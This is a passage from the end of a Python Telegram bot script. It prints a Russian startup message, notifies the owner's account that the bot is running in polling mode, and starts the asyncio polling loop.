        print(f"Бот запущен ({mode})")
        try:
            await bot.send_message(MY_USER_ID, f"🟢 <b>Бот запущен</b>\n└ Режим: polling", parse_mode="HTML")
        except Exception:
            pass

        await dp.start_polling(bot, allowed_updates=allowed)


if __name__ == "__main__":
    asyncio.run(main())
